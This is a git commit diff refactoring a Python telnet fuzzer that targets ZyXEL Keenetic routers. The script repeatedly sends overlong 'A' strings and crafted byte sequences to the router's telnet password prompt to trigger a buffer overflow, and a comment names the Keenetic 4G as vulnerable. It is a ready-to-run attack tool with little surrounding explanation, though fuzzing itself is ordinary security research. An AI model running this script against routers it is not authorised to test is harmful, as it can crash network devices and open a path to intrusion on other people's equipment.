11847ace0a9871969f2594ead2e55d1e46b504d6
0x90 <oleg.kupreev@gmail.com>
2014-04-15 16:34:58 +0400

    + ZyXEL telnet fuzzer refactored to class

--- zxfuzz.py
+++ zxfuzz.py
@@ -1,73 +1,80 @@
 #!/usr/bin/env python
 # -*- encoding: utf-8 -*-
 #
-# Dummy telnet fuzzer for ZyXELL Keenetic
+# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+#               Dummy telnet fuzzer for ZyXELL Keenetic
+# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 #
 # MacBookPro:~ 090h$ telnet 1.0.0.1
 # Trying 1.0.0.1...
 # Connected to 1.0.0.1.
 # Escape character is '^]'.
 #
-# Password : """
+# Password :
+# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# Vulnerable routers: ZyXEL Keenetic 4G, any other?
+#
+# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+#
 # author: @090h
-
+#
 from telnetlib import *
-from sys import exit
-from argparse import ArgumentParser
+from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
 from datetime import datetime
 import logging
 
-root = logging.getLogger()
-root.setLevel(logging.DEBUG)
+class ZyxellFuzzer(object):
 
-def errlog(msg):
-    logging.critical(msg)
-    exit()
+    def __init__(self, host, port=23, debug=False):
+        self.host = host
+        self.port = port
+        root = logging.getLogger()
+        if debug:
+            root.setLevel(logging.DEBUG)
 
-def zyxell_fuzz_telnet(host, port=23, start=1, finish=0):
-    msg = "Start telnet fuzzing %s:%i" % (host, port)
-    logging.info(msg)
-    tn = Telnet()
-    buflen = start
+    def fuzz_bof(self, start=1, finish=0):
+        logging.info("Start telnet fuzzing %s:%i" % (self.host, self.port))
+        tn = Telnet()
+        buflen = start
+        while buflen != finish:
+            tn.open(self.host, self.port)
 
-    while buflen != finish:
-        tn.open(host, port)
-        #print 'connected'
+            # Attempts limit == 3
+            for x in xrange(0,3):
+                buf = 'A'*buflen
+                print("Trying length 0x%X" % len(buf))
+                print(tn.read_until('Password :'))
+                tn.write(buf+'\n')
+                buflen += 1
 
-        for x in xrange(0,3):
-            buf = 'A'*buflen
-            print "Trying length 0x%X" % len(buf)
+    def fuzz2(self, length=0x42):
+        logging.info("Start telnet fuzzing %s:%i" % (self.host, self.port))
+        tn = Telnet()
+        buf = chr(19)*(length - 1)
+
+        for x in xrange(20, 255):
+            tn.open(self.host, self.port)
+            print x
+            new_buf = buf + chr(x)
+            tn.write(new_buf+'\n')
             print tn.read_until('Password :')
-            tn.write(buf+'\n')
-            #print buf
-            buflen += 1
+            tn.close()
 
-def zyxell_fuzz2(host, port=23, length=0x42):
-    #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-    msg = "Start telnet fuzzing %s:%i" % (host, port)
-    logging.info(msg)
-    tn = Telnet()
-    buflen = length - 1
-    buf = chr(19)*buflen
-
-    for x in xrange(20, 255):
-        tn.open(host, port)
-        print x
-        new_buf = buf + chr(x)
-        tn.write(new_buf+'\n')
-        print tn.read_until('Password :')
-        tn.close()
-
-if __name__ == '__main__':
-    parser = ArgumentParser(description='Dummy telnet fuzzer for ZyXELL Keenetic')
-    parser.add_argument('host', required=True,  help='Telnet host to fuzz')
-    parser.add_argument('-p', '--port', default=23, required=False, help='telnet port')
+def main():
+    parser = ArgumentParser(description='Dummy telnet fuzzer for ZyXELL Keenetic', formatter_class=ArgumentDefaultsHelpFormatter)
+    parser.add_argument('host', help='Telnet host to fuzz')
+    parser.add_argument('-p', '--port',  type=int, default=23, required=False, help='telnet port')
     parser.add_argument('-t', '--threads', action='store', type=int, default=5, help='thread count')
-    parser.add_argument('-l', '--length', action='store', type=int, default=1, help='length start')
+    parser.add_argument('-l', '--length', action='store', type=int, default=0x40, help='length start')
     parser.add_argument('--version', action='version', version='%(prog)s 0.01')
     args = parser.parse_args()
     start_time = datetime.now()
+
+    zf = ZyxellFuzzer(args.host, args.port)
+    zf.fuzz_bof(0, args.length)
+
     logging.debug("Start time: " + start_time.strftime('%Y-%m-%d %H:%M:%S'))
-    #zyxell_fuzz_telnet(args.host, args.port)
-    zyxell_fuzz2(args.host)
     logging.debug("Finish time: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+
+if __name__ == '__main__':
+    main()
